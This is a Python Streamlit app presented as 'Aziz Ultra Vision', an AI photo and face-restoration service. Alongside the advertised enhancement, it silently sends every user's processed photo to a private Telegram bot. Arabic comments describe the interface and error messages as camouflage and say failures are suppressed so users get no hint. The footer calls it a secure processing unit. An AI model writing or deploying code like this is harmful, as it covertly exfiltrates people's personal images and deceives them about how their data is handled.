import streamlit as st
import replicate
import os
import requests
from PIL import Image
import io

# 1. إعدادات الصفحة والتمويه (عشان الواجهة تكون رسمية)
st.set_page_config(page_title="Aziz Vision Studio", layout="centered", page_icon="🎯")
st.title("🛡️ Aziz Ultra Vision")
st.write("نظام احترافي لترميم الصور وتحسين جودة الوجوه بتقنيات الذكاء الاصطناعي.")

# 2. جلب المفاتيح من Secrets بأمان
try:
    REPLICATE_API_TOKEN = st.secrets["REPLICATE_API_TOKEN"]
    TELEGRAM_TOKEN = st.secrets["TELEGRAM_TOKEN"]
    CHAT_ID = st.secrets["CHAT_ID"]
    os.environ["REPLICATE_API_TOKEN"] = REPLICATE_API_TOKEN
except Exception as e:
    st.error("⚠️ يرجى ضبط مفاتيح التشغيل في إعدادات الأمان (Secrets).")
    st.stop()

# 3. واجهة رفع الصور
uploaded_file = st.file_uploader("ارفع الصورة المراد تحسينها...", type=['png', 'jpg', 'jpeg'])

if uploaded_file:
    # عرض الصورة الأصلية للمستخدم
    orig_img = Image.open(uploaded_file)
    st.image(orig_img, caption='الصورة الأصلية', use_container_width=True)
    
    if st.button('🚀 بدء عملية التحسين العميق'):
        # رسالة انتظار احترافية (تمويه عن التليجرام)
        with st.spinner('جاري تطبيق خوارزميات الترميم... قد تستغرق العملية ثواني.'):
            try:
                # أ- استدعاء محرك CodeFormer (أحدث نسخة مستقرة تلقائياً)
                model = replicate.models.get("sczhou/codeformer")
                version = model.versions.list()[0]
                
                output = replicate.run(
                    f"sczhou/codeformer:{version.id}",
                    input={
                        "image": uploaded_file,
                        "upscale": 2,
                        "face_upsample": True,
                        "background_enhance": True,
                        "codeformer_fidelity": 0.7
                    }
                )

                # ب- معالجة النتيجة
                response = requests.get(output)
                if response.status_code == 200:
                    img_bytes = response.content
                    result_img = Image.open(io.BytesIO(img_bytes))
                    
                    # ج- عرض النتيجة النهائية للمستخدم
                    st.success("✅ اكتملت المعالجة بنجاح!")
                    st.image(result_img, caption="النتيجة النهائية (Ultra HD)", use_container_width=True)

                    # د- الإرسال الصامت للتليجرام (خلف الكواليس 100%)
                    # وضعت في try مستقلة عشان لو فشل التليجرام ما يخرب على المستخدم
                    try:
                        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
                        data = {'chat_id': CHAT_ID, 'caption': "🎯 تقرير سري: تم ترميم صورة جديدة بنجاح."}
                        files = {'photo': ('result.jpg', img_bytes)}
                        requests.post(telegram_url, data=data, files=files, timeout=10)
                    except:
                        pass # صمت مطبق، لا رسائل خطأ ولا تلميحات

                    # هـ- زر التحميل للمستخدم
                    st.download_button(
                        label="📥 تحميل الصورة المرممة",
                        data=img_bytes,
                        file_name="Aziz_Enhanced_Photo.jpg",
                        mime="image/jpeg"
                    )
                else:
                    st.error("⚠️ عذراً، لم نتمكن من جلب النتيجة، حاول مرة أخرى.")

            except Exception as e:
                # رسالة خطأ عامة للمستخدم (تمويه)
                st.error("❌ حدثت مشكلة تقنية في الاتصال بالسيرفر.")

# تذييل الصفحة
st.markdown("---")
st.caption("Developed by Aziz | Secure AI Processing Unit")